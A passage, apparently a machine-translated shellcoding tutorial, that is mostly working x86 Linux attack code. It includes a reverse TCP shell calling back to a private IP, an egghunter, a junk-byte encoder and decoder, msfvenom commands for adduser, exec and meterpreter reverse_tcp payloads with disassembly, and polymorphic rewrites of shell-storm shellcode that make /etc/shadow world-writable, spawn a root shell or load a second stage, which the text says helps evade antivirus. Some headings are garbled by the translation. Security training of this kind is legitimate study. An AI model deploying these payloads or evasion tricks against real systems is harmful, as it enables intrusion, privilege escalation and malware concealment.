_start:<font></font>
	; creating socket<font></font>
	xor eax, eax<font></font>
	xor esi, esi<font></font>
	xor ebx, ebx<font></font>
	push esi<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102<font></font>
	mov bl, 1<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in and connect()<font></font>
	push esi<font></font>
	push esi<font></font>
	push 0x6a00a8c0		; IPv4 address to connect<font></font>
	push WORD 0x5c11	; port<font></font>
	push WORD 2<font></font>
	mov ecx, esp<font></font>
	push 0x16<font></font>
	push ecx<font></font>
	push edx<font></font>
	; socketcall()<font></font>
	mov al, 102<font></font>
	mov bl, 3		; connect()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup<font></font>
<font></font>
	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に：</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 reverse_tcp_shell</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
同様のコマンドを使用して、接続アドレスまたはポートを変更できます（タスク1）</font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結果</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/cv/dg/cs/cvdgcsad2nttszw7x56-iqnygwy.png" alt="画像"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. egghunterテクニック</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
egghunterの手法は、「イースターエッグ」によって指定された領域をメモリ内に配置し、その意味を事前に把握し、「egg」に続くコードに制御を移すことです。</font><font style="vertical-align: inherit;">この手法は、シェルコードの正確なロケーションアドレスがわからない場合に役立ちます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この例を示すには：</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スタックに「ゴミ」を入れます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">シェルコードをスタックに置きます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">イースターエッグをスタックに入れます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ゴミを追加します。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
「ガベージ」を生成するには、次のスクリプトを使用します。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
rdm = bytearray(random.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">96</span>))
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(rdm),<span class="hljs-number">4</span>):<font></font>
	bts = rdm[i:i+<span class="hljs-number">4</span>]<font></font>
	print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">''</span>.join(<span class="hljs-string">'{:02x}'</span>.format(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bts))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルコードを検索します：</font></font><br>
<br>
<pre><code class="plaintext hljs">	; execve_sh<font></font>
global _start<font></font>
<font></font>
section .text<font></font>
_start:<font></font>
<font></font>
        ; PUSH 0<font></font>
        xor eax, eax<font></font>
        push eax<font></font>
<font></font>
        ; PUSH //bin/sh (8 bytes)<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
<font></font>
        mov ebx, esp<font></font>
<font></font>
        push eax<font></font>
        mov edx, eax<font></font>
<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このシェルコードはコンパイルされ、そのオペコードを取得してスタックに配置する必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その結果、成功します。</font></font><br>
<br>
<pre><code class="plaintext hljs">section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; trash<font></font>
	push 0x94047484<font></font>
	push 0x8c35f24a<font></font>
	push 0x5a449067<font></font>
	push 0xf5a651ed<font></font>
	push 0x7161d058<font></font>
	push 0x3b7b4e10<font></font>
	push 0x9f93c06e<font></font>
	; shellcode execve() /bin/sh<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xe28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031<font></font>
	; egg<font></font>
	push 0xdeadbeef<font></font>
	; trash<font></font>
        push 0xd213a92d<font></font>
        push 0x9e3a066b<font></font>
        push 0xeb8cb927<font></font>
        push 0xddbaec55<font></font>
        push 0x43a73283<font></font>
        push 0x89f447de<font></font>
        push 0xacfb220f<font></font>
<font></font>
<font></font>
	mov ebx, 0xefbeadde	; egg in reverse order<font></font>
        mov esi, esp<font></font>
        mov cl, 200		; change this value for deeper or less searching<font></font>
<font></font>
find:   lodsb			; read byte from source - esi<font></font>
        cmp eax, ebx		; is it egg?<font></font>
        jz equal		; if so, give control to shellcode<font></font>
	shl eax, 8		; if not, shift one byte left<font></font>
        loop find		; repeat<font></font>
<font></font>
	xor eax, eax		; if there is no egg - exit<font></font>
        mov al, 1<font></font>
	xor ebx, ebx<font></font>
        mov bl, 10<font></font>
        int 0x80<font></font>
<font></font>
equal: jmp esi			; jmp to shellcode</code></pre><br>
<img src="https://habrastorage.org/webt/yg/yd/gt/ygydgt0qxjwf1ev2_4e0i6puwek.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
loop findをjmp findステートメントに置き換えることができますが、これによりプログラムエラーが発生する可能性があります。</font><font style="vertical-align: inherit;">この例外のハンドラーを作成することもできます。一般的なケースでは、コードで十分です。</font><font style="vertical-align: inherit;">メモリの異なる方向にある「イースターエッグ」を見つける必要がある場合があります。その場合、方向フラグの値を変更する必要があり、jmp esi + offsetを使用して制御をシェルコードに転送できます。</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.エンコーダーを作成する</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちの場合、エンコーディングは、リバースデコードに必要な情報を使用せずにシェルコードのソースコードを変更することにあり、このプロセスが暗号化プロセスと区別されます。</font><font style="vertical-align: inherit;">私が知っているように、私はこのタスクを完了することにしましたが、少し複雑です：シェルコードの目的のバイトの間に、ランダムな（1から5までの）バイト数のゴミがあります。</font><font style="vertical-align: inherit;">エンコードされたシェルコードを生成するために、次のスクリプトを記述しました。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
        print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
        sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
opcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
encoded = <span class="hljs-string">""</span><font></font>
<font></font>
b1 = bytearray.fromhex(opcode)<font></font>
<font></font>
<span class="hljs-comment"># Generates random value from 1 to 5 of 'aa' string</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b1:<font></font>
        t = <span class="hljs-string">'aa'</span> * random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)<font></font>
        encoded += <span class="hljs-string">'%02x'</span> % x + t<font></font>
<font></font>
print(encoded)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
結果はスタックにプッシュされます。</font></font><br>
<br>
<pre><code class="plaintext hljs">$./hex2stack.py $(./encoder.py $(hexopcode execve_sh))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
結論：</font></font><br>
<br>
<pre><code class="plaintext hljs">	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最初の部分0x909090aaに注意してください。</font><font style="vertical-align: inherit;">右側の最初のバイト90は、エンコードされたシェルコードの終わりです。</font><font style="vertical-align: inherit;">もちろん、他の有効な値を選択して、シェルコードの終わりを示すことができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
デコーダコード：</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	; encoded shellcode<font></font>
	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31<font></font>
<font></font>
	; prepare registers for decoding<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	mov bl, 0xaa<font></font>
<font></font>
decoder:<font></font>
	lodsb		; read byte from stack<font></font>
	cmp al, bl	; check: is it trash byte?<font></font>
	jz loopy	; if so, repeat<font></font>
	cmp al, 0x90	; is it end of shellcode?<font></font>
	jz exec		; if so, go to start of shellcode<font></font>
	stosb		; if not, place byte of shellcode into stack<font></font>
loopy:	jmp decoder	; repeat<font></font>
<font></font>
exec:	jmp esp		; give flow control to shellcode</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルコードにnop命令（0x90）がない場合、このバイトをシェルコードの終わりのマーカーとして選択できます。</font><font style="vertical-align: inherit;">それ以外の場合は、別の値を使用する必要があります。</font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結果：</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/yv/ti/4u/yvti4u7yj5dkmpbb2n7qdlzkrfq.png" alt="画像"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. GDB / libemu / ndisasmを使用してmsfvenomによって生成されたシェルコードの分析</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このセクションでは、有名なツールであるmsfvenomによって取得されたシェルコードを分析します。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. add user</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
シェルコードを生成するためのコマンド：</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/adduser -f c &gt; adduser.c
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
結果のGDBシェルコードを分析するにはいくつかのオプションがあります。私は、コードをスタックに置いて分析するという便利な方法を使用することにしました。</font></font><br>
<br>
<pre><code class="plaintext hljs">$ cat adduser.c | grep -Po "\\\x.." | tr -d '\n' | sed -e 's!\\x!!g' ; echo<font></font>
31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80</code></pre><br>
<pre><code class="plaintext hljs">$ python3 hex2stack.py 31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80<font></font>
out:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次のファイルを分析します。</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	push 0x6afc518b<font></font>
	push 0x590a6873<font></font>
	push 0x2f6e6962<font></font>
	push 0x2f3a2f3a<font></font>
	push 0x3a303a30<font></font>
	push 0x3a635249<font></font>
	push 0x3470346a<font></font>
	push 0x7349642f<font></font>
	push 0x7a413a74<font></font>
	push 0x696f6c70<font></font>
	push 0x73617465<font></font>
	push 0x6d000000<font></font>
	push 0x28e89380<font></font>
	push 0xcd04b541<font></font>
	push 0xe3896374<font></font>
	push 0x652f6861<font></font>
	push 0x702f2f68<font></font>
	push 0x64777373<font></font>
	push 0x6851c931<font></font>
	push 0x58056a80<font></font>
	push 0xcd58466a<font></font>
	push 0xcb89c931<font></font>
	jmp esp</code></pre><br>
<img src="https://habrastorage.org/webt/m2/ha/gd/m2hagdg75saw6og2p27eu-xa3dm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルコードが最初に行うことは、パラメーター（0,0）を使用してsetreuid（）を作成することです。シェルコードにはroot権限が必要です。</font><font style="vertical-align: inherit;">その後、/ etc / passwdファイルが開きます。</font><font style="vertical-align: inherit;">コードでは、ファイルを開いた後、呼び出し命令が使用されます。</font><font style="vertical-align: inherit;">この命令に続いて、プロセッサは次のコマンドをスタックに配置します。</font><font style="vertical-align: inherit;">私たちの場合、そのようなコマンドの後にユーザーパラメータを含む行が続きます。その後、この行がファイルに書き込まれます。</font><font style="vertical-align: inherit;">この方法では、任意のデータを使用してファイルに書き込むことができます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.幹部たちは、whoamiは</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
、今のは、コマンドの実行が実装されている方法を見てみましょう、ファイルへの書き込みを考え出した。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルコードを生成します。</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/exec CMD="whoami" -f raw&gt; exec_whoami.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コードを分析するには、次を実行します。</font></font><br>
<br>
<pre><code class="plaintext hljs">$sctest -vv -S -s 10000 -G shell.dot &lt; exec_whoami.bin</code></pre><br>
<pre><code class="plaintext hljs">[emu 0x0x16c8100 debug ] 6A0B                            push byte 0xb<font></font>
; execve()		<font></font>
[emu 0x0x16c8100 debug ] 58                              pop eax		<font></font>
[emu 0x0x16c8100 debug ] 99                              cwd<font></font>
; in this case - set to 0 due to cwd and small eax<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; "-c"<font></font>
[emu 0x0x16c8100 debug ] 66682D63                        push word 0x632d	<font></font>
; address of "-c"<font></font>
[emu 0x0x16c8100 debug ] 89E7                            mov edi,esp		<font></font>
; /bin/sh<font></font>
[emu 0x0x16c8100 debug ] 682F736800                      push dword 0x68732f	<font></font>
[emu 0x0x16c8100 debug ] 682F62696E                      push dword 0x6e69622f<font></font>
; 1st arg of execve()<font></font>
[emu 0x0x16c8100 debug ] 89E3                            mov ebx,esp		<font></font>
; null<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; place "whoami" in stack<font></font>
[emu 0x0x16c8100 debug ] E8                              call 0x1		<font></font>
; push "-c"<font></font>
[emu 0x0x16c8100 debug ] 57                              push edi		<font></font>
; push "/bin/sh"<font></font>
[emu 0x0x16c8100 debug ] 53                              push ebx		<font></font>
; 2nd argument of execve() <font></font>
; pointer to args<font></font>
[emu 0x0x16c8100 debug ] 89E1                            mov ecx,esp		<font></font>
; execute execve()<font></font>
[emu 0x0x16c8100 debug ] CD80                            int 0x80		</code></pre><br>
<img src="https://habrastorage.org/webt/vv/s2/mx/vvs2mxrhami1dfpzknj_1s41wvo.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
call命令は、コマンドの実行にも使用されるため、実行可能なコマンドを簡単に変更できます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. Meterpreter TCP</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
コマンドを</font><b><font style="vertical-align: inherit;">逆にして</font></b><font style="vertical-align: inherit;">ペイロードを生成する</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 -f raw &gt; meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その後</font></font><br>
<br>
<pre><code class="plaintext hljs">ndisasm -u meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コメント付きのコード</font></font><br>
<pre><code class="plaintext hljs">00000000  6A0A              push byte +0xa<font></font>
00000002  5E                pop esi			; place 10 in esi<font></font>
00000003  31DB              xor ebx,ebx			; nullify ebx<font></font>
00000005  F7E3              mul ebx<font></font>
00000007  53                push ebx			; push 0<font></font>
00000008  43                inc ebx			; 1 in ebx<font></font>
00000009  53                push ebx			; push 1<font></font>
0000000A  6A02              push byte +0x2		; push 2<font></font>
0000000C  B066              mov al,0x66			; mov socketcall<font></font>
0000000E  89E1              mov ecx,esp			; address of argument<font></font>
00000010  CD80              int 0x80			; calling socketcall() with socket()<font></font>
00000012  97                xchg eax,edi		; place sockfd in edi<font></font>
00000013  5B                pop ebx			; in ebx 1<font></font>
00000014  68C0A80066        push dword 0x6600a8c0	; place IPv4 address connect to<font></font>
00000019  680200115C        push dword 0x5c110002	; place port and proto family<font></font>
0000001E  89E1              mov ecx,esp<font></font>
00000020  6A66              push byte +0x66<font></font>
00000022  58                pop eax			; socketcall()<font></font>
00000023  50                push eax<font></font>
00000024  51                push ecx			; addresss of sockaddr_in structure<font></font>
00000025  57                push edi			; sockfd<font></font>
00000026  89E1              mov ecx,esp			; address of arguments<font></font>
00000028  43                inc ebx<font></font>
00000029  CD80              int 0x80			; call connect()<font></font>
0000002B  85C0              test eax,eax		; <font></font>
0000002D  7919              jns 0x48			; if connect successful - jmp<font></font>
0000002F  4E                dec esi			; in esi 10 - number of attempts to connect<font></font>
00000030  743D              jz 0x6f			; if zero attempts left - exit<font></font>
00000032  68A2000000        push dword 0xa2<font></font>
00000037  58                pop eax<font></font>
00000038  6A00              push byte +0x0<font></font>
0000003A  6A05              push byte +0x5<font></font>
0000003C  89E3              mov ebx,esp<font></font>
0000003E  31C9              xor ecx,ecx<font></font>
00000040  CD80              int 0x80			; wait 5 seconds<font></font>
00000042  85C0              test eax,eax<font></font>
00000044  79BD              jns 0x3<font></font>
00000046  EB27              jmp short 0x6f<font></font>
00000048  B207              mov dl,0x7			; mov dl 7 - read, write, execute for mprotect() memory area<font></font>
0000004A  B900100000        mov ecx,0x1000		; 4096 bytes<font></font>
0000004F  89E3              mov ebx,esp<font></font>
00000051  C1EB0C            shr ebx,byte 0xc<font></font>
00000054  C1E30C            shl ebx,byte 0xc		; nullify 12 lowest bits<font></font>
00000057  B07D              mov al,0x7d			; mprotect syscall<font></font>
00000059  CD80              int 0x80<font></font>
0000005B  85C0              test eax,eax<font></font>
0000005D  7810              js 0x6f			; if no success with mprotect -&gt; exit<font></font>
0000005F  5B                pop ebx			; if success put sockfd in ebx<font></font>
00000060  89E1              mov ecx,esp<font></font>
00000062  99                cdq<font></font>
00000063  B60C              mov dh,0xc<font></font>
00000065  B003              mov al,0x3			; read data from socket<font></font>
00000067  CD80              int 0x80<font></font>
00000069  85C0              test eax,eax<font></font>
0000006B  7802              js 0x6f<font></font>
0000006D  FFE1              jmp ecx			; jmp to 2nd part of shell<font></font>
0000006F  B801000000        mov eax,0x1<font></font>
00000074  BB01000000        mov ebx,0x1<font></font>
00000079  CD80              int 0x80<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このコードは、ソケットを作成し、指定されたポートの指定されたIPアドレスへの接続を試み、メモリ領域を作成し、ソケットからシェルコードの2番目の部分を読み取って、割り当てられたメモリ領域に書き込みます。</font><font style="vertical-align: inherit;">接続が失敗した場合、プログラムは5秒間待機してから再試行します。</font><font style="vertical-align: inherit;">数回失敗したか、他の例外が発生した場合は、処理を停止します。</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. shell-stormから3つのシェルコードの多相変換を実行します。</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ポリモーフィック変換は、シェルコードコードが変更され、ロジックが保持される変換です。</font><font style="vertical-align: inherit;">例：</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
xor eax、eaxはレジスタをリセットし、</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sub eax、eaxもレジスタをリセットします。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2つのオプションの違いはパフォーマンスにあります。最初のオプションは少し速く実行されます。</font><font style="vertical-align: inherit;">ポリモーフィック変換によりシェルコードの署名が変更され、アンチウイルスからシェルコードを隠すのに役立ちます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. chmod / etc / shadow</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-608.php<font></font>
	; Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes<font></font>
	; length - 40 bytes<font></font>
	section .text<font></font>
<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub ebx, ebx	; replaced<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	sub eax, eax	; replaced<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このシェルコードは、パラメーター0,0でsetuid（）を呼び出し（root権限を取得しようとします）、次に/ etc / shadowファイルに対してchmod（）を実行します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0p/db/mo/0pdbmogrsi4bdn849ylf8hbjbti.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
場合によっては、このシェルコードはレジスタをリセットせずに実行できます。</font></font><br>
<br>
<pre><code class="plaintext hljs"><font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このコードをCファイルではなくasmで「収集」すると、正常に実行できます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.実行/ビン/ sh</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-251.php<font></font>
	; (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 37 bytes<font></font>
	; length - 45 byte<font></font>
	section .text<font></font>
global _start<font></font>
_start:<font></font>
	push 0x17<font></font>
	mov eax, [esp]	; replaced<font></font>
	sub ebx, ebx	; replaced<font></font>
	imul edi, ebx	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	push 0x2e<font></font>
	mov eax, [esp]	; replaced<font></font>
	push edi 	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	sub edx, edx	; replaced<font></font>
	push 0xb<font></font>
	pop eax<font></font>
	push edi	; replaced<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
	lea ebx, [esp]	; replaced<font></font>
	push edi	; replaced<font></font>
	push edi	; replaced<font></font>
	lea esp, [ecx]	; replaced<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/9q/cl/-o/9qcl-ol-qznvbz8jckiaheke8i8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このシェルコードは、上記の例ですでに複数回検討されています。</font><font style="vertical-align: inherit;">彼は特別な説明を必要としません。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.第2段階のTCPバインドシェルコード</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; original: http://shell-storm.org/shellcode/files/shellcode-501.php<font></font>
	; linux/x86 listens for shellcode on tcp/5555 and jumps to it 83 bytes<font></font>
	; length 94<font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub eax, eax	; replaced<font></font>
	imul ebx, eax	; replaced<font></font>
	imul edx, eax	; replaced<font></font>
<font></font>
_socket:<font></font>
	push 0x6<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp] ; replaced<font></font>
	int 0x80<font></font>
<font></font>
_bind:<font></font>
	mov edi, eax	; placing descriptor<font></font>
	push edx<font></font>
	push WORD 0xb315	;/* 5555 */<font></font>
	push WORD 2<font></font>
	lea ecx, [esp]	; replaced<font></font>
	push 16<font></font>
	push ecx<font></font>
	push edi<font></font>
	xor eax, eax	; replaced<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_listen:<font></font>
	mov bl, 4	; replaced<font></font>
	push 0x1<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_accept:<font></font>
	push edx<font></font>
	push edx<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	mov bl, 5	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
	mov ebx, eax<font></font>
<font></font>
_read:<font></font>
	mov al, 0x3<font></font>
	lea ecx, [esp]	; replaced<font></font>
	mov dx, 0x7ff<font></font>
	mov dl, 1	; replaced<font></font>
	int 0x80<font></font>
	jmp esp</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このシェルコードは接続を開き、シェルコードの2番目の部分を受け取って実行します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2番目の部分のコード：</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	mov ebx, 100<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/no/zo/n2/nozon26a2dzjtvnngfwkrrz10cc.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ご覧のとおり、シェルコードの2番目の部分は成功しています。</font><font style="vertical-align: inherit;">プログラムの終了コードは100です。</font></font><br>
<br>
